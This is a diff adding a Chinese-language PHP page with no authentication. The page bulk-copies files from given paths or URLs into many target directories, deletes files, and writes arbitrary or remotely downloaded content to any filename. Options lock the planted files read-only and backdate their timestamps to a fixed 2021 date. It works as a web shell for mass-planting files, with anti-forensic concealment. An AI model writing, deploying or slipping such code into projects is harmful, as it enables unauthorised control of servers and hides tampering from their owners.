@@ -1,0 +1,205 @@
+<html>
+
+<head>
+    <title></title>
+    <style type="text/css">
+        .ppp {
+            display: flex;
+            align-items: center;
+        }
+    .ppp1 {            display: flex;
+            align-items: center;
+}
+    .ppp2 {            display: flex;
+            align-items: center;
+}
+    .ppp21 {display: flex;
+            align-items: center;
+}
+    .ppp11 {display: flex;
+            align-items: center;
+}
+.ppp211 {display: flex;
+            align-items: center;
+}
+    </style>
+</head>
+
+<body>
+    <form action="" method="POST">
+        <div style="display: flex;align-items: center;justify-content: space-around;">
+          <div class="ppp">
+            <table width="100%" border="1" bordercolor="#0033CC">
+                  <tr>
+                    <td><table width="100%" border="3">
+                      <tr>
+                        <td width="200" bordercolor="#000000">地址：</td>
+                        <td width="87%"><span class="ppp11">
+                          <textarea name="yurls" rows="10" cols="80"></textarea>
+                        </span></td>
+                      </tr>
+                      <tr>
+                        <td width="200" bordercolor="#000000">选项:</td>
+                        <td><table width="414" border="0">
+                            <tr>
+                              <td width="67"><label>上锁:</label></td>
+                              <td width="337"><label>
+                                <input name="zuo" type="checkbox" id="zuo" value="1">
+                              </label></td>
+                            </tr>
+                            <tr>
+                              <td>修改时间</td>
+                              <td><input name="time2" type="checkbox" id="time2" value="2">
+                                  <label></label></td>
+                            </tr>
+                        </table></td>
+                      </tr>
+                      <tr>
+                        <td width="200" bordercolor="#000000">输入目标地址：</td>
+                        <td><span class="ppp211">
+                          <textarea name="turls" rows="30" cols="100"></textarea>
+                        </span></td>
+                      </tr>
+                      <tr>
+                        <td>&nbsp;</td>
+                        <td><button type="submit" name="action" value="upload">一键复制</button>
+                            <button type="submit" name="action" value="delete">一键删除</button></td>
+                      </tr>
+                    </table></td>
+                  </tr>
+                  <tr>
+                    <td>&nbsp;</td>
+                  </tr>
+                  <tr>
+                    <td><table width="100%" border="1" bordercolor="#669900">
+                      <tr>
+                        <td>输入创建文件名：</td>
+                        <td><input name="filename" />
+                          &nbsp;</td>
+                      </tr>
+                      <tr>
+                        <td width="23%">输入内容或者url：</td>
+                        <td width="77%"><textarea name="context" rows="20" cols="100"></textarea>
+                          &nbsp;</td>
+                      </tr>
+                      <tr>
+                        <td colspan="2"><div align="center">
+                          <button type="submit" name="action" value="addbycot">内容上传</button>
+                          <button type="submit" name="action" value="addbyurl">下载上传</button>
+                        </div></td>
+                      </tr>
+                    </table></td>
+                  </tr>
+                </table>
+          </div>
+            <div class="ppp">
+              <div align="center"></div>
+            </div>
+        </div>
+
+    </form>
+<?php
+
+    error_reporting(E_ALL ^ E_NOTICE ^ E_WARNING);
+
+    function endWith($str, $suffix)
+    {
+        $length = strlen($suffix);
+        if ($length == 0) {
+            return true;
+        }
+        return (substr($str, -$length) === $suffix);
+    }
+    function upload()
+    {
+        $yurl = $_POST['yurls'];
+        $turl = $_POST['turls'];
+			$zuo= $_POST['zuo'];
+	$time2= $_POST['time2'];
+        $yurls = explode("\n", $yurl);
+        $turls = explode("\n", $turl);
+
+        if ($yurl && $turl) {
+            foreach ($yurls as $k0 => $v0) {
+                $yname = end(explode("/", $v0));
+                foreach ($turls as $key => $value) {
+
+                    $mburl = trim($value) . "/" . trim($yname);
+                echo $mburl;
+				echo "<br>";
+                copy(trim($v0), trim($mburl));
+				  if ($zuo == 1)  {
+				chmod( trim($mburl),0444);
+				}
+				
+				if ($time2 == 2)  {
+				touch(trim($mburl),mktime(19,5,10,10,26,2021));
+		
+				}
+                }
+            }
+        }
+        if ($yurl && $turl)
+            echo "上传完毕";
+    }
+
+    function delete()
+    {
+        $yurl = $_POST['yurls'];
+        $turl = $_POST['turls'];
+        $yurls = explode("\n", $yurl);
+        $turls = explode("\n", $turl);
+
+        if ($yurl && $turl) {
+            foreach ($yurls as $k0 => $v0) {
+                $yname = end(explode("/", $v0));
+                if(!$yname){
+                    $yname=$v0;
+                }
+                foreach ($turls as $key => $value) {
+
+                    $mburl = trim($value) . "/" . trim($yname);
+                    unlink($mburl);
+                }
+            }
+        }
+        if ($yurl && $turl)
+            echo "删除完毕";
+    }
+
+ function add()
+    {
+
+        $cot = $_POST['context'];
+        $fname = $_POST['filename'];
+        if ($cot && $fname) {
+            if ($_POST['action'] == 'addbycot') {
+                $content = $cot;
+            } else {
+                $content = file_get_contents(trim($cot));
+            }
+
+            $myfile = fopen($fname, "w") or die("失败");
+            fwrite($myfile,  $content);
+            fclose($myfile);
+            echo "上传成功";
+        }
+    }
+
+    if ($_POST['action'] == 'upload') {
+        @upload();
+    }
+    if ($_POST['action'] == 'delete') {
+        delete();
+    }
+	if ($_POST['action'] == 'addbycot' || $_POST['action'] == 'addbyurl') {
+        @add();
+    }
+
+    ?>
+	
+	
+	
+</body>
+
+</html>
